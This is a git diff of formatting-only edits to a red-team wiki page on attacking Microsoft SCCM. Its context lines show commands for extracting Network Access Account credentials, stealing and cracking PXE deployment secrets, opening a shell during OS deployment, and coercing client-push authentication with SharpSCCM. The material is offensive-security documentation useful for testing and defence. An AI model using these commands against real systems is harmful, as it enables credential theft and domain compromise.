@@ -31,7 +31,7 @@ It is worth to note that, even after deleting or changing the NAA in the SCCM co
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-### SystemDPAPIdump
+#### SystemDPAPIdump
 
 From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher via DPAPI the WMI blob related to SCCM and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
 
@@ -39,7 +39,7 @@ From UNIX-like systems, with administrative privileges over a device enrolled in
 SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
 ```
 
-### Manualy
+#### Manualy
 
 On the other hand, it is possible, from a controlled computer account, to manually request the SCCM policy and retrieve the NAAs inside.
 
@@ -83,9 +83,9 @@ To decode username and password use `.\DeobfuscateSecretString.exe` contained in
 policysecretdecrypt.exe $HEX_STRING
 ```
 
-### SCCMHunter
+#### SCCMHunter
 
-#### HTTP
+**HTTP**
 
 Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/_xpn_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
 
@@ -97,7 +97,7 @@ python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
 python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
 ```
 
-#### DPAPI
+**DPAPI**
 
 [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) DPAPI's module can also be used, with valid credentials for a local administrator on the target system, to remotely extract NAA credentials located in the local WMI repository.
 
@@ -232,7 +232,7 @@ Several secrets could be retreived from Operating System Deployment (OSD)
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-#### No Password
+**No Password**
 
 Without PXE password protection, we can use [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) (Python) as follow, to extract secrets from the Operating System Deployment.
 
@@ -240,7 +240,7 @@ Without PXE password protection, we can use [pxethiefy.py](https://github.com/ss
 sudo python3 pxethiefy.py explore -i eth0
 ```
 
-#### Password Protected
+**Password Protected**
 
 If a PXE password is set, we can use [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) (Python) as follow. It will automaticly download encrypted files and extract the hash.
 
@@ -248,7 +248,7 @@ If a PXE password is set, we can use [pxethiefy.py](https://github.com/sse-secur
 sudo python3 pxethiefy.py explore -i eth0
 ```
 
-We can then try to crack it  using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module).
+We can then try to crack it using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module).
 
 ```bash
 # Seting up Hashcat 
@@ -273,7 +273,7 @@ pxethiefy.py decrypt -p "password" -f ./2023.05.05.10.43.44.0001.{85CA0850-35DC-
 {% endtab %}
 
 {% tab title="Windows" %}
-#### No Password
+**No Password**
 
 Without PXE password protection, we can use [PXEThief](https://github.com/MWR-CyberSec/PXEThief) as follow, to extract secrets from the Operating System Deployment.
 
@@ -281,7 +281,7 @@ Without PXE password protection, we can use [PXEThief](https://github.com/MWR-Cy
 python.exe pxethief.py 2 $SCCM_IP
 ```
 
-#### Password Protected
+**Password Protected**
 
 If PXE password is set, we can start with [PXEThief](https://github.com/MWR-CyberSec/PXEThief)
 
@@ -299,7 +299,7 @@ tftp -i 192.168.33.11 GET "\SMSTemp\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB
 python.exe pxethief.py 5 '.\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var'
 ```
 
-We can then try to crack it  using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module). (check the UNIX-like tab for more details).
+We can then try to crack it using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module). (check the UNIX-like tab for more details).
 
 Decrypt the file using the found password
 
@@ -313,7 +313,7 @@ py.exe pxethief.py 3 ".\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF1
 
 {% tabs %}
 {% tab title="F8-Debugging" %}
-If "Enable command support" is enabled, we can spawn a shell during OS deployment by pressing F8.&#x20;
+If "Enable command support" is enabled, we can spawn a shell during OS deployment by pressing F8.
 
 <figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
@@ -353,7 +353,7 @@ Inveigh.exe
 
 **Step 2: Trigger Client-Push Installation**
 
-```PowerShell
+```powershell
 # If admin access over Management Point (MP)
 SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
 
